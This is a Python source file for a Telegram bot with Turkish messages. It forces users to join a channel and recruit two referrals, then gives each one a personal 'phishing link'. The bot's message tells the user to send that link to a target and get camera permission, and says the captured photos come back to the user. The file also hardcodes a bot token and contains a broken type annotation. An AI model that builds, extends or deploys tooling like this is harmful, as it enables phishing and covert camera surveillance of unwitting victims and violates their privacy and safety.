import asyncio
import logging
from aiogram import Bot, Dispatcher, F
from aiogram.filters import CommandStart, Command
from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
from database import init_db, add_user, mark_active, get_user_stats

TOKEN = "8767529923:AAH18FJFClgGKjiAiVhQv-DyUctOAscWB4M"
CHANNEL_USERNAME = "@swarovskiyeniden"
DOMAIN = "http://127.0.0.1:5000" # Kendi Ngrok veya sunucu linkinle değiştirmelisin

bot = Bot(token=TOKEN)
dp = Dispatcher()

async def check_subscription(user_id: int) -> bool:
    try:
        member = await bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
        return member.status in ["member", "administrator", "creator"]
    except Exception:
        return False

@dp.message(CommandStart())
async def cmd_start(message: Message):
    args = message.text.split(maxsplit=1)
    referrer_id = None
    
    if len(args) > 1 and args[1].isdigit():
        referrer_id = int(args[1])

    add_user(message.from_user.id, referrer_id)
    mark_active(message.from_user.id)

    is_subscribed = await check_subscription(message.from_user.id)
    
    if not is_subscribed:
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="📢 Kanalımıza Katıl", url="https://t.me/swarovskiyeniden")],
            [InlineKeyboardButton(text="🔄 Kontrol Et", callback_data="check_sub")]
        ])
        await message.answer("Botu kullanabilmek için öncelikle kanalımıza katılmanız gerekmektedir.", reply_markup=keyboard)
        return

    await show_main_menu(message)

async def show_main_menu(message: Message):
    refs, unlocked = get_user_stats(message.from_user.id)
    
    if unlocked:
        phishing_link = f"{DOMAIN}/view/{message.from_user.id}"
        text = (
            f"🎉 **Tebrikler!** Referans şartını tamamladın.\n\n"
            f"🔗 **Senin Phishing Linkin:**\n`{phishing_link}`\n\n"
            f"Bu linki hedefe atıp kamera izni almasını sağla. Gelen fotoğraflar anında sana ve sisteme düşecek."
        )
        await message.answer(text, parse_mode="Markdown")
    else:
        ref_link = f"https://t.me/{(await bot.get_me()).username}?start={message.from_user.id}"
        text = (
            f"⚠️ **Sistem Kilidi Aktif!**\n\n"
            f"Phishing aracını açabilmek için **2 kişiyi** davet etmen gerekiyor.\n"
            f"Davet ettiğin kişilerin bota `/start` vermesi ve kanala katılması şarttır.\n\n"
            f"📊 **İlerleme:** {refs}/2 Davet\n\n"
            f"🔗 **Referans Linkin:**\n`{ref_link}`"
        )
        await message.answer(text, parse_mode="Markdown")

@dp.callback_query(F.data == "check_sub")
async def callback_check_sub(callback: callback):
    is_subscribed = await check_subscription(callback.from_user.id)
    if is_subscribed:
        await callback.message.delete()
        await show_main_menu(callback.message)
    else:
        await callback.answer("❌ Hala kanala katılmadınız!", show_alert=True)

async def main():
    init_db()
    logging.basicConfig(level=logging.INFO)
    print("[*] Bot başlatılıyor...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
